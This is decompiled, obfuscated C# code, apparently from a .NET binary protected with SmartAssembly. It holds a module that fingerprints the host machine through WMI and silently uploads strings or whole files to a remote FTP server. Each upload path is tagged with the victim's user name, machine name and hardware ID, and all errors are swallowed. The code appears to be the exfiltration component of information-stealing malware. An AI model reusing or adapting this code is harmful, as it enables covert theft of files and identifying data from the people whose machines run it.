using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

internal sealed class VcazhUwaHziY
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string ZAMBktwaWtQb()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107404220));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107404231)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107404182);
		ManagementObject val3 = new ManagementObject(getString_0(107404177) + text2 + getString_0(107404168));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107404163)).ToString();
		return text3 + text;
	}

	public static void jErmpSoHYIUl(string YWCPJgexupHB = "URL", string XJHfNhwLeUgv = "USERNAME", string momSPGYuqHY = "ACCESO", string kFjpfnIPsSd = "")
	{
		try
		{
			string text = ZAMBktwaWtQb();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(YWCPJgexupHB + getString_0(107407943) + Environment.UserName + getString_0(107407898) + Environment.MachineName + getString_0(107407909) + text + getString_0(107407904));
			ftpWebRequest.Method = getString_0(107404138);
			ftpWebRequest.Credentials = new NetworkCredential(XJHfNhwLeUgv, momSPGYuqHY);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(kFjpfnIPsSd);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void bQfUCjfaQPg(string nkRXlgSdZvXfD = "URL", string sRXTYZYITvTYZYoCE = "USERNAME", string BPqFqRQlbEBFeGB = "ACCESO", string QlpTzUJqRBR = "")
	{
		try
		{
			string text = ZAMBktwaWtQb();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(nkRXlgSdZvXfD + getString_0(107407943) + Environment.UserName + getString_0(107407898) + Environment.MachineName + getString_0(107407909) + text + getString_0(107407909) + Path.GetFileName(QlpTzUJqRBR));
			ftpWebRequest.Method = getString_0(107404138);
			ftpWebRequest.Credentials = new NetworkCredential(sRXTYZYITvTYZYoCE, BPqFqRQlbEBFeGB);
			byte[] array = File.ReadAllBytes(QlpTzUJqRBR);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static VcazhUwaHziY()
	{
		Strings.CreateGetStringDelegate(typeof(VcazhUwaHziY));
	}
}
